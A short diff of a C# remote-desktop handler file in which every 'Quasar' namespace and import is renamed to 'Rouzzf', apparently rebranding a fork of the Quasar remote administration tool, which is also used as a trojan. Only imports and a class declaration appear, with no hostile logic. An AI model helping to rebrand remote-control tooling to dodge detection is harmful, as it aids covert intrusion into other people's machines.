@@ -1,16 +1,16 @@
-﻿using Quasar.Client.Helper;
-using Quasar.Common.Enums;
-using Quasar.Common.Messages;
-using Quasar.Common.Networking;
-using Quasar.Common.Video;
-using Quasar.Common.Video.Codecs;
+﻿using Rouzzf.Client.Helper;
+using Rouzzf.Common.Enums;
+using Rouzzf.Common.Messages;
+using Rouzzf.Common.Networking;
+using Rouzzf.Common.Video;
+using Rouzzf.Common.Video.Codecs;
 using System;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Windows.Forms;
 
-namespace Quasar.Client.Messages
+namespace Rouzzf.Client.Messages
 {
     public class RemoteDesktopHandler : NotificationMessageProcessor, IDisposable
     {
